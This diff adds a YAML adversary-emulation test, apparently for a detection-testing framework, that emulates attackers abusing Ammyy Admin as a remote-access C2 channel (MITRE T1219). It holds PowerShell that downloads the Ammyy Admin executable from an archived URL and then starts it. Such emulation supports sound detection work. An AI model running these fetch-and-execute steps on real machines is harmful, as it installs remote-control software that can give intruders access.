@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Ammyy Admin Software Execution
+description: "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n"
+args:
+    - name: Ammyy_Admin_Path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe
+uuid: 0ae9e327-3251-465a-a53b-485d4e3f58fa
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1219: Remote Access Software'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})
+      inline: |
+        if (Test-Path "#{Ammyy_Admin_Path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe" -UseBasicParsing
+        }}
+      executor: powershell
+    - name: ammyy-admin-software-execution
+      inline: |
+        Start-Process "{{.Args.Ammyy_Admin_Path}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            Stop-Process -Name "Ammyy" -force -erroraction silentlycontinue
+        executor: powershell
